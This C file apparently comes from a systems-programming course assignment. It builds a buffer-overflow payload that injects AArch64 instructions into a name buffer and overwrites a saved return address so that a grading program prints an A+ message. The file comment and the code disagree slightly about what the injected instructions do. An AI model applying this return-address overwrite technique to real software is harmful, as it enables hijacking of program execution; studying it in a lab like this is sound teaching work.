/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Joshua (Kimyung) Song, Sergei Kudriavtcev                  */
/*--------------------------------------------------------------------*/

/* File comment:
 Produces a file called dataAplus that earns an A+. The file first
 writes the readable name and a null byte into the name array, then
 writes instructions later in the same array. It pads to getName's
 saved x30 and overwrites x30 with the address of those instructions.
 When getName returns, the injected instructions write 'A' and '+' into
 grade, then branch back to main.
 */

#include <stdio.h>
#include "miniassembler.h"

/* Function comment:
main takes no command-line arguments and does not read from stdin or
any other input stream. It writes binary data directly into a file
named "dataAplus", and produces no output to stdout or stderr. The
function returns 0 on success.
*/
int main(void) {
    FILE *psFile;
    unsigned int uiInstr;
    unsigned long ulAddr;
    int i;

    psFile = fopen("dataAplus", "w");
    fprintf(psFile, "Josh Song"); /* prints name bytes */
    putc('\0', psFile);

    /* A+ string */
    fprintf(psFile, "A+ is your grade.");
    putc('\0', psFile);

    /* padding after "Josh Song" and "A+ is your grade." */
    for (i = 28; i < 32; i++) {
        putc('A', psFile);
    }

    uiInstr = MiniAssembler_strb(1, 0); /* strb w1, [x0] */

    /* instruction 1 at name[32] */
    /* adr x0, 0x420062 where name[10] has A+ string */
    uiInstr = MiniAssembler_adr(0, 0x420062, 0x420078);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 2 at name[36] */
    /* mov w1, #10 with newline character*/
    uiInstr = MiniAssembler_mov(1, 10);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 3 at name[40] */
    /* b 0x4008ac, branching back to main after print */
    uiInstr = MiniAssembler_b(0x4008ac, 0x420080);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* padding */
    for (i = 44; i < 48; i++) {
        putc('A', psFile);
    }
    
    /* write address of name[32] in x30 */
    ulAddr = 0x420078;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
